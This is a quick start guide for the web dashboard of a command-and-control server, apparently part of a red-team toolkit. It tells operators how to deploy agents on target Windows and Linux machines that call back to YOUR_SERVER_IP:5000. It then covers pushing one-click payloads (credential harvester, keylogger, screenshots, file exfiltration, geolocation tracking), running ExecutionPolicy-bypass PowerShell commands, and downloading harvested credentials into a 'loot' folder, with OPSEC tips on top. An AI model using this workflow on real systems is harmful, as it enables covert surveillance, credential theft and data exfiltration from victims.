# 🌐 Web GUI Quick Start Guide

## Overview

The Web GUI provides an intuitive dashboard for managing your C&C operations without requiring CLI expertise. Perfect for team members who prefer graphical interfaces.

## Features

### 📊 Real-time Dashboard
- **Bot Statistics**: Total bots, online status, command success rate
- **Live Updates**: Auto-refreshes every 10 seconds
- **Visual Feedback**: Color-coded status indicators

### 🤖 Bot Management
- **Interactive Bot List**: Click to select and manage bots
- **Connection Details**: View host, port, username for each bot
- **Status Monitoring**: Online/offline indicators

### ⚡ Quick Actions
- **One-Click Payloads**: Deploy all 7 payloads with a single click
  - Credential Harvester
  - Keylogger
  - Screenshot Capture
  - Network Scanner
  - File Exfiltrator
  - PrivEsc Checker
  - Geolocation Tracker

### 💻 Advanced Operations
- **Custom Commands**: Execute any PowerShell or bash command
- **File Upload**: Upload payloads and scripts to bots
- **File Download**: Retrieve results and exfiltrated data
- **Live Output**: Real-time command output and logs

## Getting Started

### 1. Start the C&C Server

```bash
python src/cnc_server.py
```

Expected output:
```
[*] Starting C&C Server...
[*] Web GUI available at: http://localhost:5000
[*] API Endpoints:
    - POST /add_bot
    - POST /send_command
    - POST /upload_file
    - POST /download_file
    - GET  /bots
    - GET  / (Web GUI)
 * Running on http://0.0.0.0:5000
```

### 2. Access the Web GUI

Open your browser and navigate to:
```
http://localhost:5000
```

Or from another machine on the network:
```
http://YOUR_SERVER_IP:5000
```

### 3. Deploy Agents

Deploy agents on target systems to register bots with the C&C server:

**Windows:**
```powershell
.\payloads\windows_agent.ps1 -CncServer "http://YOUR_SERVER_IP:5000" -SshPassword "yourpassword"
```

**Linux:**
```bash
chmod +x payloads/linux_agent.sh
./payloads/linux_agent.sh YOUR_SERVER_IP 5000
```

### 4. Manage Bots via GUI

1. **Select a Bot**: Click on any bot in the left panel
2. **Deploy Payloads**: Click payload buttons for one-click deployment
3. **Execute Commands**: Enter custom commands in the command box
4. **Transfer Files**: Use upload/download sections for file operations

## Usage Examples

### Deploying a Payload

1. Click on a bot in the "Active Bots" panel (turns green when selected)
2. Click the desired payload button (e.g., "🔑 Credentials")
3. The GUI automatically:
   - Uploads the payload to the target
   - Executes it with appropriate parameters
   - Shows progress in the output panel

### Executing Custom Commands

1. Select a bot
2. Enter command in the "Custom Command" textarea:
   ```powershell
   whoami /all
   ```
3. Click "Execute Command"
4. View output in the bottom panel

### Uploading Files

1. Select a bot
2. In "Upload File" section:
   - **Local Path**: `./payloads/custom_script.ps1`
   - **Remote Path**: `C:\Temp\custom_script.ps1`
3. Click "Upload"

### Downloading Files

1. Select a bot
2. In "Download File" section:
   - **Remote Path**: `C:\Temp\harvested_credentials`
   - **Local Path**: `./loot/credentials/`
3. Click "Download"

## GUI Features Explained

### Statistics Cards

```
┌─────────────┬─────────────┬──────────────┬──────────────┐
│ Total Bots  │ Online Bots │ Commands Sent│ Success Rate │
│     5       │      5      │      47      │     98%      │
└─────────────┴─────────────┴──────────────┴──────────────┘
```

- **Total Bots**: All registered bots
- **Online Bots**: Currently connected bots
- **Commands Sent**: Total commands executed this session
- **Success Rate**: Percentage of successful commands

### Active Bots Panel

Shows all connected bots with:
- **Bot ID**: Unique identifier
- **Connection Info**: Host:Port
- **Username**: SSH username
- **Status**: Online/Offline indicator

Click any bot to select it (turns green).

### Payload Buttons

Pre-configured payload deployments:
- **🔑 Credentials**: Harvests browser passwords, WiFi keys, saved credentials
- **⌨️ Keylogger**: Captures keystrokes for 5 minutes
- **📸 Screenshot**: Takes 10 screenshots at 30-second intervals
- **🌐 Network Scan**: Scans local subnet
- **📁 File Exfil**: Searches for and collects sensitive files
- **🔓 PrivEsc Check**: Scans for privilege escalation vectors
- **📍 Geolocation**: Gathers location data via IP/WiFi/GPS

### Output Panel

Real-time logs with color coding:
- **Green Border**: Success messages
- **Blue Border**: Informational messages
- **Red Border**: Error messages

Auto-scrolls to show latest output.

## Payload Deployment Workflow

When you click a payload button, the GUI automatically:

1. **Upload Phase**: Transfers the PowerShell script to `C:\Temp\`
2. **Execution Phase**: Runs the script with `-Silent` flag
3. **Output Phase**: Script saves results to output directory/file
4. **Feedback**: Shows success/error messages in output panel

Example output:
```
[14:32:15] Deploying 🔑 Deploy Credential Harvester to TARGET-WIN10-1234...
[14:32:17] ✓ Uploaded windows_credential_harvester.ps1
[14:32:19] ✓ Payload executed successfully
[14:32:19] Output will be saved to: C:\Temp\harvested_credentials
```

## Tips for Team Members

### For Beginners

1. **Start Simple**: Use the one-click payload buttons
2. **Select First**: Always select a bot before any action
3. **Watch Output**: Monitor the output panel for feedback
4. **Download Results**: Use the download feature to retrieve results

### Common Operations

**Quick Recon**:
1. Select bot
2. Click "🌐 Network Scan"
3. Click "📍 Geolocation"
4. Download results

**Credential Harvesting**:
1. Select bot
2. Click "🔑 Credentials"
3. Wait for completion (check output panel)
4. Download from `C:\Temp\harvested_credentials`

**Surveillance**:
1. Select bot
2. Click "⌨️ Keylogger" and "📸 Screenshot"
3. Let run for desired duration
4. Download results

### Advanced Users

**Custom Payload Deployment**:
1. Upload your custom script via "Upload File"
2. Execute via "Custom Command":
   ```powershell
   powershell -ExecutionPolicy Bypass -File C:\Temp\your_script.ps1
   ```

**Background Operations**:
```powershell
Start-Job -ScriptBlock { powershell -File C:\Temp\long_running.ps1 }
```

**Multi-Step Operations**:
```powershell
cd C:\Temp; .\payload1.ps1; .\payload2.ps1; Compress-Archive -Path results -DestinationPath data.zip
```

## Troubleshooting

### "Please select a bot first!"
- You must click on a bot in the left panel before executing commands

### "Failed to fetch bots"
- Ensure C&C server is running
- Check network connectivity
- Verify server address in browser URL

### "Deployment failed"
- Ensure bot is online and reachable
- Check SSH credentials are correct
- Verify payload files exist in `./payloads/` directory

### No bots showing
- Deploy agents on target systems first
- Check agent is configured with correct C&C server URL
- Verify firewall allows connections on port 5000

### Command execution timeout
- Large operations may take time
- Check output panel for progress
- For long-running tasks, use background jobs

## Security Notes

### Access Control
- **Internal Network Only**: Restrict access to trusted network
- **Firewall Rules**: Configure firewall to allow only authorized IPs
- **Authentication**: Consider adding authentication layer for production use

### OPSEC
- **HTTPS**: For production, use HTTPS instead of HTTP
- **VPN**: Route traffic through VPN for operational security
- **Logging**: Monitor access logs for unauthorized access attempts

### Best Practices
- **Regular Updates**: Keep checking bot status
- **Clean Operations**: Remove payloads after use
- **Secure Passwords**: Use strong SSH passwords for agents
- **Log Review**: Regularly check output logs

## API Integration

The GUI uses these REST API endpoints:

```
GET  /              - Web GUI interface
GET  /bots          - List all connected bots
POST /add_bot       - Register new bot
POST /send_command  - Execute command on bot
POST /upload_file   - Upload file to bot
POST /download_file - Download file from bot
```

You can also use these endpoints directly with `curl` or other tools.

## Mobile Access

The GUI is responsive and works on tablets/mobile devices:
1. Ensure device is on same network as C&C server
2. Open browser
3. Navigate to `http://SERVER_IP:5000`

**Note**: Some features work better on desktop browsers.

## Customization

### Changing Server Port

Edit `src/cnc_server.py`:
```python
app.run(host='0.0.0.0', port=8080, debug=True)  # Change 5000 to 8080
```

### Modifying Payload Paths

Edit `web_gui.html` in the `payloadConfigs` object to customize:
- File paths
- Remote deployment paths
- Default command parameters

### Adding New Payloads

Add new buttons to `web_gui.html`:
```javascript
payloadConfigs['your_payload'] = {
    title: '🎯 Your Payload',
    file: 'your_payload.ps1',
    remotePath: 'C:\\Temp\\your_payload.ps1',
    command: 'powershell -File C:\\Temp\\your_payload.ps1'
};
```

Then add button to HTML:
```html
<button class="payload-btn" onclick="deployPayload('your_payload')">
    🎯 Your Payload
</button>
```

## Support

For CLI usage, refer to:
- `RED_TEAM_GUIDE.md` - Comprehensive deployment guide
- `WINDOWS_PAYLOADS_GUIDE.md` - Native payload documentation
- `CNC_INTEGRATION_GUIDE.md` - API integration examples
- `QUICK_REFERENCE.md` - Command reference

---

**Quick Start Checklist**:
- ✅ Start C&C server: `python src/cnc_server.py`
- ✅ Open browser: `http://localhost:5000`
- ✅ Deploy agents on targets
- ✅ Select bot in GUI
- ✅ Click payload buttons or execute custom commands
- ✅ Download results

**The Web GUI makes C&C operations accessible to everyone on your team, regardless of technical expertise.**
